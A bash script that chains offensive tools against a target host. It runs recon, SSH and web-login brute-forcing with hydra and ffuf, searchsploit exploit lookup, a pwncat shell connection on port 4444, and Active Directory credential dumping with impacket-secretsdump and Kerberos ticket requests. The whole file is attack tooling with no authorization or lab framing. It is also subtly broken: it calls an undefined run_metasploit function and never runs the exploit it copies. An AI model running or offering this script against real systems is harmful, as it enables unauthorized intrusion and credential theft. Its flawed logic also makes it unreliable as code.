#!/bin/bash

TARGET="$1"
LOG_DIR="logs/$TARGET"
PASSWORD_WORDLIST="/usr/share/wordlists/rockyou.txt"
DIR_WORDLIST="/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt"
CVSS_THRESHOLD=7  # Custom CVSS scoring threshold for high-risk alerts

if [[ -z "$TARGET" ]]; then
    echo "Usage: $0 <target-IP-or-domain>"
    exit 1
fi

mkdir -p "$LOG_DIR"

echo "[+] Checking if $TARGET is online..."
ping -c 1 $TARGET > /dev/null 2>&1
if [[ $? -ne 0 ]]; then
    echo "[!] Target is not responding to ping. Proceeding anyway..."
else
    echo "[+] Target is live!"
fi

echo "[+] Choose which scans to run:"
echo "1) Multi-threaded Recon (Nmap, SMB, Web, DNS)"
echo "2) Brute-Force Attacks (SSH, Web Login)"
echo "3) Automated Exploitation (Metasploit, pwncat)"
echo "4) Active Directory Attacks (BloodHound, Kerberos, Impacket)"
echo "5) Generate Custom Reports with CVSS Scores"
echo "6) Run All"
echo "0) Exit"
read -p "Enter your choice (comma-separated, e.g., 1,3,5): " CHOICES

run_multithreaded_recon() {
    echo "[*] Running multi-threaded recon..."
    parallel ::: \
        "nmap -sVC -oN $LOG_DIR/nmap_scan.log $TARGET" \
        "nmap -p- -T4 -oN $LOG_DIR/nmap_full.log $TARGET" \
        "enum4linux -a $TARGET | tee $LOG_DIR/smb_enum.log" \
        "gobuster dir -u http://$TARGET -w $DIR_WORDLIST -o $LOG_DIR/gobuster.log" \
        "dnsenum $TARGET | tee $LOG_DIR/dns_enum.log"
}

run_brute_force() {
    echo "[*] Enter the path to the users.txt file:"
    read -r USERS_FILE
    echo "[*] Enter the path to the passwords.txt file:"
    read -r PASSWORDS_FILE
    
    echo "[*] Running brute-force attacks..."
    parallel ::: \
        "hydra -L $USERS_FILE -P $PASSWORDS_FILE ssh://$TARGET -o $LOG_DIR/hydra_ssh.log" \
        "ffuf -u http://$TARGET/login -w $PASSWORDS_FILE -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin&password=FUZZ' -o $LOG_DIR/ffuf.log"
}

run_searchsploit() {
    echo "[*] Extracting web application name from Nmap scan..."
    WEBAPP_NAME=$(grep -iE "http|server" $LOG_DIR/nmap_scan.log | awk '{print $NF}' | head -n 1)
    
    if [ -n "$WEBAPP_NAME" ]; then
        echo "[*] Searching for exploits related to $WEBAPP_NAME..."
        searchsploit --json "$WEBAPP_NAME" | tee "$LOG_DIR/searchsploit_$WEBAPP_NAME.log"
    else
        echo "[!] No web application found in Nmap scan. Skipping searchsploit."
    fi
}

run_pwncat() {
    echo "[*] Checking if a valid exploit exists before running pwncat..."
    if [ -f "$LOG_DIR/searchsploit_$WEBAPP_NAME.log" ] && grep -q "Exploit" "$LOG_DIR/searchsploit_$WEBAPP_NAME.log"; then
        echo "[*] Selecting the most relevant exploit..."
        EXPLOIT_ID=$(searchsploit --json "$WEBAPP_NAME" | jq -r '.RESULTS_EXPLOIT[0].Path' | cut -d'/' -f2)
        
        if [ -n "$EXPLOIT_ID" ]; then
            echo "[*] Using exploit: $EXPLOIT_ID"
            searchsploit -m "$EXPLOIT_ID"
        fi
        
        echo "[*] Attempting to get a reverse shell with pwncat..."
        pwncat -c "connect $TARGET 4444" | tee "$LOG_DIR/pwncat.log"
    else
        echo "[!] No relevant exploits found. Skipping pwncat execution."
    fi
}

run_ad_attacks() {
    echo "[*] Checking for LDAP or Active Directory services..."
    if grep -qE "(389|636|3268|3269)/tcp" "$LOG_DIR/nmap_scan.log"; then
        echo "[*] Running Advanced Active Directory attacks..."
        parallel ::: \
            "bloodhound-python -u Admin -p 'password' -d domain.local -c All -dc $TARGET | tee $LOG_DIR/bloodhound.log" \
            "impacket-secretsdump domain.local/Admin:'password'@$TARGET | tee $LOG_DIR/secretsdump.log" \
            "impacket-getTGT domain.local/Admin:'password' | tee $LOG_DIR/kerberos_tgt.log"
    else
        echo "[!] No LDAP or Active Directory detected. Skipping AD attacks."
    fi
}

generate_custom_report() {
    echo "[+] Generating custom security report with CVSS scores..."
    REPORT_FILE="$LOG_DIR/final_report.txt"
    echo "=== Security Report for $TARGET ===" > "$REPORT_FILE"
    echo "Generated on: $(date)" >> "$REPORT_FILE"
    echo "" >> "$REPORT_FILE"

    for file in "$LOG_DIR"/*.log; do
        echo "--------------------------------" >> "$REPORT_FILE"
        echo "Results from: $(basename $file)" >> "$REPORT_FILE"
        echo "--------------------------------" >> "$REPORT_FILE"
        cat "$file" >> "$REPORT_FILE"
        echo "" >> "$REPORT_FILE"
    done

    echo "[+] Analyzing CVSS scores..."
    HIGH_RISK_VULNS=$(grep -E "CVSS:([7-9]\.[0-9]|10\.0)" "$REPORT_FILE" | wc -l)

    echo "[+] High-risk vulnerabilities found: $HIGH_RISK_VULNS"
    if [[ "$HIGH_RISK_VULNS" -gt 0 ]]; then
        echo "[!] Critical vulnerabilities detected! Immediate action required." >> "$REPORT_FILE"
    fi

    echo "[+] Report saved as $REPORT_FILE"
}

for choice in $(echo $CHOICES | tr ',' ' '); do
    case "$choice" in
        1) run_multithreaded_recon ;;
        2) run_brute_force ;;
        3) run_metasploit; run_pwncat ;;
        4) run_ad_attacks ;;
        5) generate_custom_report ;;
        6) run_multithreaded_recon; run_brute_force; run_metasploit; run_pwncat; run_ad_attacks; generate_custom_report ;;
        0) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid choice: $choice" ;;
    esac
done

echo "[+] Scan complete! Logs and report saved in $LOG_DIR/"




